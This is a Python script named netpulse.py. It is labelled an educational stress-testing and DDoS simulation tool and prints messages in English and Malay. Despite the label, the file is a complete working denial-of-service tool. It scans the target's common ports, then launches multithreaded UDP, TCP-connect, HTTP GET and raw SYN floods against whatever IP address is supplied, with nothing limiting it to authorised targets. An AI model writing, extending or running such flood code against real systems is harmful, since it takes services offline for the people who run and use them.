# netpulse.py - CLI Stress Testing & DDoS Simulation Tool (Educational Use Only)

import argparse
import socket
import threading
import random
import time
import os
import sys
from datetime import datetime
import scapy.all as scapy

BANNERS = {
    "en": """
 _   _      _   _____       _                  
| \ | |    | | |  __ \     | |                 
|  \| | ___| |_| |__) |   _| |_ ___  _ __ ___  
| . ` |/ _ \ __|  ___/ | | | __/ _ \| '__/ _ \ 
| |\  |  __/ |_| |   | |_| | || (_) | | |  __/ 
|_| \_|\___|\__|_|    \__,_|\__\___/|_|  \___| 
                                               
        NetPulse - Cyber Defense & Load Simulator
    """,
    "ms": """
 _   _      _   _____       _                  
| \ | |    | | |  __ \     | |                 
|  \| | ___| |_| |__) |   _| |_ ___  _ __ ___  
| . ` |/ _ \ __|  ___/ | | | __/ _ \| '__/ _ \ 
| |\  |  __/ |_| |   | |_| | || (_) | | |  __/ 
|_| \_|\___|\__|_|    \__,_|\__\___/|_|  \___| 
                                               
     NetPulse - Simulasi Ujian & Alat Pertahanan
    """
}

def prompt_language():
    choice = input("Select language (en/ms): Pilih bahasa (en/ms): ").strip().lower()
    return choice if choice in ["en", "ms"] else "en"

def reverse_dns(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return "No PTR"

def scan_ports(ip, ports=[21,22,23,53,80,110,139,443,445,8080]):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            continue
    return open_ports

def get_geoip_info(ip):
    return "(GeoIP not available – offline mode)"

def detect_vpn(ip):
    return "(VPN detection offline – no API used)"

def send_udp_packets(ip, port, duration, lang):
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(1024)
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"[{ 'SENT' if lang == 'en' else 'HANTAR' }][UDP] #{sent} -> {ip}:{port}")
        except:
            continue

def send_tcp_packets(ip, port, duration, lang):
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(random._urandom(1024))
            sent += 1
            print(f"[{ 'SENT' if lang == 'en' else 'HANTAR' }][TCP] #{sent} -> {ip}:{port}")
            sock.close()
        except:
            continue

def http_flood(ip, port, duration, lang):
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            http_req = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
            sock.send(http_req.encode())
            sent += 1
            print(f"[{ 'SENT' if lang == 'en' else 'HANTAR' }][HTTP] #{sent} -> {ip}:{port}")
            sock.close()
        except:
            continue

def syn_flood(ip, port, duration, lang):
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            scapy.send(scapy.IP(dst=ip)/scapy.TCP(dport=port, flags="S"), verbose=False)
            sent += 1
            print(f"[{ 'SENT' if lang == 'en' else 'HANTAR' }][SYN] #{sent} -> {ip}:{port}")
        except:
            continue

def generate_report(ip, lang):
    print("========== REPORT ==========")
    print(f"Target: {ip}")
    print(f"Hostname: {reverse_dns(ip)}")
    print(f"Open Ports: {', '.join(map(str, scan_ports(ip))) or 'None'}")
    print(f"GeoIP: {get_geoip_info(ip)}")
    print(f"VPN Detected: {detect_vpn(ip)}")
    print("============================")

def main():
    lang = prompt_language()
    print(BANNERS[lang])

    parser = argparse.ArgumentParser(description="NetPulse - CLI Simulation Tool")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--time", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--method", choices=['udp', 'tcp', 'http', 'syn'], default='udp', help="Attack method")
    args = parser.parse_args()

    generate_report(args.target, lang)
    print(f"[{ 'STARTING' if lang == 'en' else 'MULAKAN' }] {'Attacking' if lang == 'en' else 'Menyerang'} {args.target}:{args.port} using {args.method.upper()} for {args.time}s with {args.threads} threads")

    method_func = {
        'udp': send_udp_packets,
        'tcp': send_tcp_packets,
        'http': http_flood,
        'syn': syn_flood
    }[args.method]

    for _ in range(args.threads):
        thread = threading.Thread(target=method_func, args=(args.target, args.port, args.time, lang))
        thread.daemon = True
        thread.start()

    time.sleep(args.time)
    print(f"[{ 'DONE' if lang == 'en' else 'SELESAI' }] {'Attack completed' if lang == 'en' else 'Serangan selesai' }.")

if __name__ == "__main__":
    if os.geteuid() != 0 and sys.platform.startswith("linux"):
        print("[!] Please run as root for raw packet access.")
    main()
